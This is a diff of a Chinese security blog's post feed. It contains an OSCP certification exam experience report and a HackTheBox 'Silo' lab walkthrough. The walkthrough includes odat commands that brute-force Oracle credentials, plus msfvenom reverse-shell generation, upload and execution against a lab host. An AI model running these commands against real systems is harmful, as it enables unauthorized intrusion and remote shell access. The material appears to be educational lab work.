+<p>前三个Challenge都是一些根据课程内容设计出的练习机器，他们有的是单独的，有的是相互关联的，这个不会事先告诉你，需要你自己去领悟，如果在对一台机器进行了足够多的尝试后，还是无法找到突破口，那么就可以考虑去尝试其他机器，或许在其他机器上，你就能找到关于这台机器的一些解题思路。</p>
+<p>另外，OffSec官方也是在discord有建立交流频道，如果有不会的课程练习以及靶场中的一些问题，都可以进去询问学员或者他们的导师，但都不会直接给出答案，而是一个个谜语人，答案需要自己去悟。</p>
+<p>旧的<code>labs</code>总共75台机器，新的则是57台，后面三个Challenge就是往年的一些真实考题，与考试的构成是一模一样，一个域环境加三台独立的主机。</p>
+<h1 id="报名"><a href="#报名" class="headerlink" title="报名"></a>报名</h1><p>报名的话需要一张支持外币的信用卡，VISA，万事达都可以，如果实在没有，可以走国内的谷安代理，而且谷安也有时会给出一些优惠，对自己水平不够自信的话也可以联系谷安进行针对性的培训，但OffSec官方是极力推荐自学通过考试的，看个人选择。</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/image/image.6v582ez73as0.png"
+                     
+                ></p>
+<p>目前有三种套餐可以选购：</p>
+<ul>
+<li>课程考试包：$1599，可以选择一门课程，自带90天的靶场访问时间，和一次考试的机会。</li>
+<li>Learn One：$2499，可以选择一门课程，一年的靶场访问时间，两次考试机会，外带所有基础课程。</li>
+<li>Learn Unlimited：$5499，一年之内可以学习所有课程，和一年之内访问靶场的时间（也是所有课程的靶场都可以访问），无限的考试机会（但不是无间隔的，第一次考试没过，需要等待一段时间后在申请第二次，间隔时间会比上面两个短一点），外带所有基础课程。</li>
+</ul>
+<p>由于我没有钱，所以就先只考虑报一个课程考试包，选OSCP课程。</p>
+<p>联系国内的代理David报名后，转账激活账户即可开始学习。</p>
+<h1 id="备考"><a href="#备考" class="headerlink" title="备考"></a>备考</h1><p>报名后即开始备考，先把课程视频和课程材料看了一遍，做了部分课程练习，之后在打靶场，先做前几个Challenge，最后几个在快考试的时候去做。</p>
+<p>备考练习时，最好不用习惯性的用sqlmap、Metasploit这种限制类的工具，能手动注入就手动注入，能找到其他方法就用其他方法，减少依赖性，不然考试的时候习惯性的用起来就不太好了。</p>
+<p>扫描端口的时候最好多扫几遍，否则很容易漏下端口，可能漏下的就是关键性的。</p>
+<p>不要执着于Web上，虽然大多数都是从Web作为突破口，但有少数是在一个偏僻的端口上运行着一个存在漏洞的服务。</p>
+<p>经历了一个月多一点的学习和练习后，完成了除去Challenge 3以外的所有Challenge，也拿到了十分的奖励积分，我预约了北京时间7月17日上午十点的考试。</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/image/image.18ra4zul77ts.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/image/20230625160420.6zl14e39nho0.webp"
+                     
+                ></p>
+<h1 id="考试要求"><a href="#考试要求" class="headerlink" title="考试要求"></a>考试要求</h1><p>考试总时长为24小时，结束后有24小时的时间来写报告并提交，考试中全程需要开启摄像头和屏幕共享供监考，可以睡觉或暂时离开，跟考官说一下就行。</p>
+<p>不能使用除考试设备之外的电子设备，包括手机、平板电脑，也不能用手机或平板当监考摄像头。</p>
+<p>在考试中，不能使用商业工具（如Burpsuite Pro、Coablt Strike等）、自动化利用工具（如sqlmap）、chatgpt类问答AI、大型漏扫（如AWVS）、可能影响网络的其他工具。</p>
+<p>考试中对Metasploit的使用也是有限制的，只可以对一个目标使用，且该目标不能为域环境内的主机，当申请使用后，无论成功与否，都无法在对第二个目标使用，但可以无限次的对第一个目标使用，而使用<code>msfvenom</code>和<code>exploit/multi/handler</code>是不受限制的。</p>
+<p>考试总分为100分，达到70分即可通过，目标为3台独立主机和一个域环境，域环境中包括了3台主机，如果没有拿到奖励积分，要通过考试，域环境是必须要拿下的。</p>
+<p>3台独立主机中，每台的普通用户权限和管理员权限分别占10分，总计60分；域环境中，总计40分，没有步骤分，也就是要么全部拿到，要么一分没有。</p>
+<p>考试结束后，还需要编写考试报告，报告中需要写上你的操作步骤，以及所采用的命令，或者自己写的脚本，以及第三方的脚本工具等，和最终拿到flag的命令回显，表示成功获得权限的证明是，通过交互式shell从原始位置读取flag，webshell是不可以的，必须要截图，截图中要包括flag的内容，以及这台机器的IP地址。</p>
+<p>考试报告最好是写的清晰明了一点，因为他们是根据你报告中的步骤去做一遍，如果能够复现出来，则证明考试结果有效，否则一分没有。</p>
+<h1 id="考试过程"><a href="#考试过程" class="headerlink" title="考试过程"></a>考试过程</h1><p>考试时间是48小时，其实只有23小时45分钟，还是15分钟是监考用来检查摄像头和验证身份的。</p>
+<p>考官会要求你打开摄像头，并将摄像头围绕你的考试环境环顾一周，并且在摄像头范围内不允许出现第二台电子设备，手机也得远离你随手可及的地方，并展示可以证明你身份的政府证件，如护照、身份证公证件。由于我不在户籍所在地，且办理护照需要一个月时间，所以我采用的是身份证公证件，只需要去当地的公证处，带上户口和身份证，和工作人员说要参加一个美国的资格认证考试，让他帮你公正一下身份证即可，如果摄像头拍的证件考官看不清，可以事先用手机拍照，然后传到电脑上，在桌面打开给考官看。</p>
+<p>当一切验证完成以后，考官就会给你事先预留的邮箱中发送一封带有检测脚本的邮件，下载后在运行，并将结果粘贴至他给你的一个链接中即可，完成后，还会发送一封带有VPN连接包和考试靶机IP的邮件，下载好VPN连接包，在kali中连接即可开始考试。</p>
+<p>在考试过程中，监考人员是听不到你的声音的，沟通是通过一个在线的聊天平台进行沟通。</p>
+<p>在7月17日，提前十五分钟，在9：45进入监考平台，我是购买的外接USB摄像头，考官要求拿着摄像头环顾四周，以及桌底，和桌面，确认无误后就给我发送了邮件。</p>
+<p>考试肯定是优先做域的，域分值为40分，不管有没有拿到奖励积分，最好是先把域做完，在将近12点的时候，找到了入口点，提权很快，没花多久，拿下第一台的管理员权限，接下来就是搭建隧道，横向移动，这一部分也很快，不知道是不是我运气好，还是抽到的题目简单，每次都能一阵见血的找到突破点，还没到下午两点就拿下了整个域。</p>
+<p>和考官说了一声，就去吃了个饭，休息了会，在下午四点的时候，继续开始做独立主机，第一台独立主机拿shell也很快，但是提权部分卡了非常非常久，到最后快晚上七点的时候才找到提权方法，原本打完域给我的盲目自信现在都给我干碎了。</p>
+<p>我为了求稳，还是考虑拿了10分的奖励积分，算上域的40分和独立机器的20分，我已经可以通过考试了，但是还是为了求稳，尝试在打下一台独立机器，这一台独立机器就没有那么的顺利了，光shell就拿了快两个小时，到九点的时候，才最终提权拿到root权限，这个时候已经有点累了，不想动了，之前做练习和打htb的时候，都没有过一次性做过这么长时间，脑子已经开始有点晕了，但我还是想试试最后一台机器。</p>
+<p>最后一台机器我也不知道是因为我太菜了还是机器有问题，死活就是找不到突破点，最终到了11点多，实在坚持不住了，先放弃了，算下分数，已经有90分了，就索性不打了。</p>
+<p>原本想着睡醒了在写报告的，还是打算现在就写，利用在线翻译，把报告翻译成英文，然后把步骤截图和flag截图全贴上，到了凌晨十二点多，写完了，在检查了一遍，没啥问题后，和考官说了一声，就提前结束了考试，我看了一下，我熬走了五个监考…哈哈哈。</p>
+<p>将报告转成pdf格式，压缩，改名，上传，一步梭哈，然后倒头就睡。</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/image/imagecd.3d56mwnkyt20.webp"
+                     
+                ></p>
+<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>事先也了解过报告审核时间，很多都是两三天，甚至还有隔天就出结果的，我等了6天，一度认为是我的报告写的有问题，但最终还是在等了6天，4个工作日后，我在7月24日下午一点多收到了通过的邮件。</p>
+<p>在此，由衷的感谢那些在我备考期间给予我帮助和鼓励的人。</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/image/image.2zyl5uc86ki0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/image/image.6zdqtas811k0.webp"
+                     
+                ></p>
+]]></content>
+      <tags>
+        <tag>OffSec</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>OpenAdmin - HackTheBox</title>
     <url>/post/ba6552ba24b2/</url>
     <content><![CDATA[<p><img  
@@ -10452,115 +10561,6 @@
 ]]></content>
       <tags>
         <tag>Hack-The-Box</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>OSCP</title>
-    <url>/post/86d0e942ee7c/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>OSCP（Offensive Security Certified Professional）是由OffSec（也就是kali的设计以及维护官方）推出的一个渗透认证考试，要求持有者在安全的实验室环境中成功攻击和渗透各种实时机器，不设立笔试环节。</p>
-<h1 id="课程内容与变化"><a href="#课程内容与变化" class="headerlink" title="课程内容与变化"></a>课程内容与变化</h1><p>OffSec官方今年3月份的时候宣布更新了PEN-200的课程和考试内容（又名PEN-200-2023，后面又改回去了），这也意味着难度可能更高。</p>
-<p>主要的变化有：</p>
-<ul>
-<li>移出了前置的基础内容，包括：熟悉Kali Linux、命令行使用等</li>
-<li>移出了缓冲区溢出内容</li>
-<li>扩充了SQL注入部分</li>
-<li>扩充了提权部分</li>
-<li>扩充了端口转发和隧道部分</li>
-<li>扩充了Active Directory部分</li>
-</ul>
-<p>这次的更新变化还是挺大的，以前如果在考试的时候遇见缓冲区溢出的题目，那么这将是送分题，而且每个缓冲区溢出的题目分值都不低，大多在15-20分，<del>这也意味着没法混</del>，而扩展的SQL注入、提权、以及AD域的内容则更贴切当前的行业需求吧，毕竟现在都这么卷，要是不会个内网提权啥的，都没人看你一眼。</p>
-<p>而之前获得奖励积分的条件也改变了：</p>
-<ul>
-<li>获得30台主机的<code>proof.txt</code></li>
-<li>完成每个模块中80%的练习</li>
-</ul>
-<p>proof.txt也就是靶场练习中的root权限flag，而模块练习则是需要每一个模块中的练习题，都完成至总进度的百分之八十，少一个都不行，但是模块练习中的一些题目则很让人难受，我记得有一题填空题，我只是忘记将它的开头字母大写而已，死活就是验证不正确。</p>
-<p>总的来说，练习不难，但恶心，如果对自己有信心，就可以不用考虑去拿这10分的奖励积分。</p>
-<p>新<code>labs</code>面板如下图所示</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/image/image.45u9o77hqaq0.webp"
-                     
-                ></p>
-<p>这是在OffSec官方的discord频道中找到的</p>
-<p>前三个Challenge都是一些根据课程内容设计出的练习机器，他们有的是单独的，有的是相互关联的，这个不会事先告诉你，需要你自己去领悟，如果在对一台机器进行了足够多的尝试后，还是无法找到突破口，那么就可以考虑去尝试其他机器，或许在其他机器上，你就能找到关于这台机器的一些解题思路。</p>
-<p>另外，OffSec官方也是在discord有建立交流频道，如果有不会的课程练习以及靶场中的一些问题，都可以进去询问学员或者他们的导师，但都不会直接给出答案，而是一个个谜语人，答案需要自己去悟。</p>
-<p>旧的<code>labs</code>总共75台机器，新的则是57台，后面三个Challenge就是往年的一些真实考题，与考试的构成是一模一样，一个域环境加三台独立的主机。</p>
-<h1 id="报名"><a href="#报名" class="headerlink" title="报名"></a>报名</h1><p>报名的话需要一张支持外币的信用卡，VISA，万事达都可以，如果实在没有，可以走国内的谷安代理，而且谷安也有时会给出一些优惠，对自己水平不够自信的话也可以联系谷安进行针对性的培训，但OffSec官方是极力推荐自学通过考试的，看个人选择。</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/image/image.6v582ez73as0.png"
-                     
-                ></p>
-<p>目前有三种套餐可以选购：</p>
-<ul>
-<li>课程考试包：$1599，可以选择一门课程，自带90天的靶场访问时间，和一次考试的机会。</li>
-<li>Learn One：$2499，可以选择一门课程，一年的靶场访问时间，两次考试机会，外带所有基础课程。</li>
-<li>Learn Unlimited：$5499，一年之内可以学习所有课程，和一年之内访问靶场的时间（也是所有课程的靶场都可以访问），无限的考试机会（但不是无间隔的，第一次考试没过，需要等待一段时间后在申请第二次，间隔时间会比上面两个短一点），外带所有基础课程。</li>
-</ul>
-<p>由于我没有钱，所以就先只考虑报一个课程考试包，选OSCP课程。</p>
-<p>联系国内的代理David报名后，转账激活账户即可开始学习。</p>
-<h1 id="备考"><a href="#备考" class="headerlink" title="备考"></a>备考</h1><p>报名后即开始备考，先把课程视频和课程材料看了一遍，做了部分课程练习，之后在打靶场，先做前几个Challenge，最后几个在快考试的时候去做。</p>
-<p>备考练习时，最好不用习惯性的用sqlmap、Metasploit这种限制类的工具，能手动注入就手动注入，能找到其他方法就用其他方法，减少依赖性，不然考试的时候习惯性的用起来就不太好了。</p>
-<p>扫描端口的时候最好多扫几遍，否则很容易漏下端口，可能漏下的就是关键性的。</p>
-<p>不要执着于Web上，虽然大多数都是从Web作为突破口，但有少数是在一个偏僻的端口上运行着一个存在漏洞的服务。</p>
-<p>经历了一个月多一点的学习和练习后，完成了除去Challenge 3以外的所有Challenge，也拿到了十分的奖励积分，我预约了北京时间7月17日上午十点的考试。</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/image/image.18ra4zul77ts.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/image/20230625160420.6zl14e39nho0.webp"
-                     
-                ></p>
-<h1 id="考试要求"><a href="#考试要求" class="headerlink" title="考试要求"></a>考试要求</h1><p>考试总时长为24小时，结束后有24小时的时间来写报告并提交，考试中全程需要开启摄像头和屏幕共享供监考，可以睡觉或暂时离开，跟考官说一下就行。</p>
-<p>不能使用除考试设备之外的电子设备，包括手机、平板电脑，也不能用手机或平板当监考摄像头。</p>
-<p>在考试中，不能使用商业工具（如Burpsuite Pro、Coablt Strike等）、自动化利用工具（如sqlmap）、chatgpt类问答AI、大型漏扫（如AWVS）、可能影响网络的其他工具。</p>
-<p>考试中对Metasploit的使用也是有限制的，只可以对一个目标使用，且该目标不能为域环境内的主机，当申请使用后，无论成功与否，都无法在对第二个目标使用，但可以无限次的对第一个目标使用，而使用<code>msfvenom</code>和<code>exploit/multi/handler</code>是不受限制的。</p>
-<p>考试总分为100分，达到70分即可通过，目标为3台独立主机和一个域环境，域环境中包括了3台主机，如果没有拿到奖励积分，要通过考试，域环境是必须要拿下的。</p>
-<p>3台独立主机中，每台的普通用户权限和管理员权限分别占10分，总计60分；域环境中，总计40分，没有步骤分，也就是要么全部拿到，要么一分没有。</p>
-<p>考试结束后，还需要编写考试报告，报告中需要写上你的操作步骤，以及所采用的命令，或者自己写的脚本，以及第三方的脚本工具等，和最终拿到flag的命令回显，表示成功获得权限的证明是，通过交互式shell从原始位置读取flag，webshell是不可以的，必须要截图，截图中要包括flag的内容，以及这台机器的IP地址。</p>
-<p>考试报告最好是写的清晰明了一点，因为他们是根据你报告中的步骤去做一遍，如果能够复现出来，则证明考试结果有效，否则一分没有。</p>
-<h1 id="考试过程"><a href="#考试过程" class="headerlink" title="考试过程"></a>考试过程</h1><p>考试时间是48小时，其实只有23小时45分钟，还是15分钟是监考用来检查摄像头和验证身份的。</p>
-<p>考官会要求你打开摄像头，并将摄像头围绕你的考试环境环顾一周，并且在摄像头范围内不允许出现第二台电子设备，手机也得远离你随手可及的地方，并展示可以证明你身份的政府证件，如护照、身份证公证件。由于我不在户籍所在地，且办理护照需要一个月时间，所以我采用的是身份证公证件，只需要去当地的公证处，带上户口和身份证，和工作人员说要参加一个美国的资格认证考试，让他帮你公正一下身份证即可，如果摄像头拍的证件考官看不清，可以事先用手机拍照，然后传到电脑上，在桌面打开给考官看。</p>
-<p>当一切验证完成以后，考官就会给你事先预留的邮箱中发送一封带有检测脚本的邮件，下载后在运行，并将结果粘贴至他给你的一个链接中即可，完成后，还会发送一封带有VPN连接包和考试靶机IP的邮件，下载好VPN连接包，在kali中连接即可开始考试。</p>
-<p>在考试过程中，监考人员是听不到你的声音的，沟通是通过一个在线的聊天平台进行沟通。</p>
-<p>在7月17日，提前十五分钟，在9：45进入监考平台，我是购买的外接USB摄像头，考官要求拿着摄像头环顾四周，以及桌底，和桌面，确认无误后就给我发送了邮件。</p>
-<p>考试肯定是优先做域的，域分值为40分，不管有没有拿到奖励积分，最好是先把域做完，在将近12点的时候，找到了入口点，提权很快，没花多久，拿下第一台的管理员权限，接下来就是搭建隧道，横向移动，这一部分也很快，不知道是不是我运气好，还是抽到的题目简单，每次都能一阵见血的找到突破点，还没到下午两点就拿下了整个域。</p>
-<p>和考官说了一声，就去吃了个饭，休息了会，在下午四点的时候，继续开始做独立主机，第一台独立主机拿shell也很快，但是提权部分卡了非常非常久，到最后快晚上七点的时候才找到提权方法，原本打完域给我的盲目自信现在都给我干碎了。</p>
-<p>我为了求稳，还是考虑拿了10分的奖励积分，算上域的40分和独立机器的20分，我已经可以通过考试了，但是还是为了求稳，尝试在打下一台独立机器，这一台独立机器就没有那么的顺利了，光shell就拿了快两个小时，到九点的时候，才最终提权拿到root权限，这个时候已经有点累了，不想动了，之前做练习和打htb的时候，都没有过一次性做过这么长时间，脑子已经开始有点晕了，但我还是想试试最后一台机器。</p>
-<p>最后一台机器我也不知道是因为我太菜了还是机器有问题，死活就是找不到突破点，最终到了11点多，实在坚持不住了，先放弃了，算下分数，已经有90分了，就索性不打了。</p>
-<p>原本想着睡醒了在写报告的，还是打算现在就写，利用在线翻译，把报告翻译成英文，然后把步骤截图和flag截图全贴上，到了凌晨十二点多，写完了，在检查了一遍，没啥问题后，和考官说了一声，就提前结束了考试，我看了一下，我熬走了五个监考…哈哈哈。</p>
-<p>将报告转成pdf格式，压缩，改名，上传，一步梭哈，然后倒头就睡。</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/image/imagecd.3d56mwnkyt20.webp"
-                     
-                ></p>
-<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>事先也了解过报告审核时间，很多都是两三天，甚至还有隔天就出结果的，我等了6天，一度认为是我的报告写的有问题，但最终还是在等了6天，4个工作日后，我在7月24日下午一点多收到了通过的邮件。</p>
-<p>在此，由衷的感谢那些在我备考期间给予我帮助和鼓励的人。</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/image/image.2zyl5uc86ki0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/image/image.6zdqtas811k0.webp"
-                     
-                ></p>
-]]></content>
-      <tags>
-        <tag>OffSec</tag>
       </tags>
   </entry>
   <entry>
@@ -13060,144 +13060,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Silo - HackTheBox</title>
-    <url>/post/db9844d688e0/</url>
-    <content><![CDATA[<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.7813626dbw80.webp"
-                     
-                ></p>
-<p>nmap扫描</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.89rs9ssgdo0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.pu0bwkvdv1c.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.2qrqyfcw0te0.webp"
-                     
-                ></p>
-<p>扫一下445</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.3n4yzgufros0.webp"
-                     
-                ></p>
-<p>没有永恒之蓝</p>
-<p>访问80端口</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.1r7ww3ow69s0.webp"
-                     
-                ></p>
-<p>iis欢迎界面</p>
-<p>访问47001</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.1vbwkydd2pog.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.6fht9pu643s0.webp"
-                     
-                ></p>
-<p>发现一个oracle TNS，貌似是个oracle数据库，搜一下</p>
-<p><code>https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener</code></p>
-<p><code>https://qtranspose.xyz/posts/htb-silo/#http</code></p>
-<p>这个oracle TNS貌似可以rce</p>
-<p><code>https://github.com/quentinhardy/odat</code></p>
-<p>下载项目</p>
-<p><code>./odat-libc2.17-x86_64 sidguesser -s 10.10.10.82 -p 1521</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.ho3dzvzjy7k.webp"
-                     
-                ></p>
-<p>获取数据库名称为XE</p>
-<p>用工具自带的字典爆破一下数据库账号密码</p>
-<p><code>./odat-libc2.17-x86_64 passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file accounts/accounts_small.txt</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.7889xjjpau00.webp"
-                     
-                ></p>
-<p>账号密码为：<code>scott/tiger</code></p>
-<p>调用模块执行代码</p>
-<p><code>./odat-libc2.17-x86_64 java -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --sysdba --test-module</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.3ezcodypd0q0.webp"
-                     
-                ></p>
-<p>换一个模块</p>
-<p><code>./odat-libc2.17-x86_64 dbmsscheduler -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --sysdba --test-module</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.4zcee92fms40.webp"
-                     
-                ></p>
-<p>在换另一个模块进行利用</p>
-<p><code>./odat-libc2.17-x86_64 utlfile -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --sysdba --test-module</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.4zilfythb14.webp"
-                     
-                ></p>
-<p>利用msf生成一个反弹shell，并将其上传</p>
-<p><code>msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.17 lport=7777 -f exe -o shell.exe</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.3v4z8tcb5tg0.webp"
-                     
-                ></p>
-<p><code>./odat-libc2.17-x86_64 utlfile -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --sysdba --putFile c:/windows/temp shell.exe /root/shell.exe</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.72mbqrmdtc40.webp"
-                     
-                ></p>
-<p>在利用externaltable模块执行反弹shell</p>
-<p><code>./odat-libc2.17-x86_64 externaltable -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --sysdba --exec c:/windows/temp shell.exe</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.f31n5tjbzew.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.jo2kfj0yh14.webp"
-                     
-                ></p>
-]]></content>
-      <tags>
-        <tag>Hack-The-Box</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Shocker - HackTheBox</title>
     <url>/post/83ca457128e3/</url>
     <content><![CDATA[<p><img  
@@ -13357,6 +13219,144 @@
                      lazyload
                      alt="image"
                      data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Shocker/image.5jn03mh02i80.webp"
+                     
+                ></p>
+]]></content>
+      <tags>
+        <tag>Hack-The-Box</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Silo - HackTheBox</title>
+    <url>/post/db9844d688e0/</url>
+    <content><![CDATA[<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.7813626dbw80.webp"
+                     
+                ></p>
+<p>nmap扫描</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.89rs9ssgdo0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.pu0bwkvdv1c.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.2qrqyfcw0te0.webp"
+                     
+                ></p>
+<p>扫一下445</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.3n4yzgufros0.webp"
+                     
+                ></p>
+<p>没有永恒之蓝</p>
+<p>访问80端口</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.1r7ww3ow69s0.webp"
+                     
+                ></p>
+<p>iis欢迎界面</p>
+<p>访问47001</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.1vbwkydd2pog.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.6fht9pu643s0.webp"
+                     
+                ></p>
+<p>发现一个oracle TNS，貌似是个oracle数据库，搜一下</p>
+<p><code>https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener</code></p>
+<p><code>https://qtranspose.xyz/posts/htb-silo/#http</code></p>
+<p>这个oracle TNS貌似可以rce</p>
+<p><code>https://github.com/quentinhardy/odat</code></p>
+<p>下载项目</p>
+<p><code>./odat-libc2.17-x86_64 sidguesser -s 10.10.10.82 -p 1521</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.ho3dzvzjy7k.webp"
+                     
+                ></p>
+<p>获取数据库名称为XE</p>
+<p>用工具自带的字典爆破一下数据库账号密码</p>
+<p><code>./odat-libc2.17-x86_64 passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file accounts/accounts_small.txt</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.7889xjjpau00.webp"
+                     
+                ></p>
+<p>账号密码为：<code>scott/tiger</code></p>
+<p>调用模块执行代码</p>
+<p><code>./odat-libc2.17-x86_64 java -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --sysdba --test-module</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.3ezcodypd0q0.webp"
+                     
+                ></p>
+<p>换一个模块</p>
+<p><code>./odat-libc2.17-x86_64 dbmsscheduler -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --sysdba --test-module</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Silo/image.4zcee92fms40.webp"
+                     
+                ></p>
+<p>在换另一个模块进行利用</p>
+<p><code>./odat-libc2.17-x86_64 utlfile -s 10.10.10.82 -p 1521 -d XE -U scott -P tiger --sysdba --test-module</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
